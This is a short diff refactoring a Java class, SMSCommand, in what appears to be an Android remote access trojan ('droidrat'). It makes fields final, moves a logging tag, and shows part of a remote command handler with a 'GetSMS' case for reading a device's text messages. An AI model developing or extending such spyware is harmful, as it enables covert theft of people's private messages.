@@ -13,11 +13,9 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class SMSCommand extends CommandFather {
 
-    private final String TAG = "SMS Event ";
+    private final SMS sms;
 
-    private SMS sms;
-
-    private Context context;
+    private final Context context;
 
     public SMSCommand(Context context) {
         sms = new SMS();
@@ -33,6 +31,7 @@ public class SMSCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
+            String TAG = "SMS Event ";
             switch (rawCommandArray[1]) {
                 case "GetSMS":
                     List<String> smsList;
